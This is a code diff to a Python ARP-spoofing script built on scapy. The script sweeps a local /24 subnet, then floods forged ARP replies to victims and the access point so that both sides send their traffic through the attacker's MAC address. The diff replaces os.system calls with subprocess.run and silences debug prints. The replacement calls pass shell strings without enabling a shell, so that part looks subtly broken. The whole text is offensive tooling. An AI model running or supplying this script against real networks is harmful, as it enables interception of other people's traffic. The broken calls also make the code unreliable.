@@ -37,8 +37,8 @@ def scan_net(ip):
 	prefix_ip = ".".join(ip.split(".")[:3])
 	for i in range(255):
 		try_ip = prefix_ip+".{}".format(i)
-		os.system("sudo arp -d {} > /dev/null 2>&1".format(try_ip))
-		os.system("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip))
+		subprocess.run("sudo arp -d {} > /dev/null 2>&1".format(try_ip))
+		subprocess.run("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip))
 	time.sleep(2)
 
 
@@ -72,14 +72,14 @@ def arp():
 	for i in range(len(vip)):
 		p.append(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
 		hwdst=vmac[i], hwsrc=attacker_mac, op=2))		
-	print(p)
+	#print(p)
 	
 	# for i in range(len(vip)):
 
 	for v in range(len(vip)):
 		for i in range(10):
-			print('send arp ', i)
-			print(vip[v],vmac[v])
+			#print('send arp ', i)
+			#print(vip[v],vmac[v])
 			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
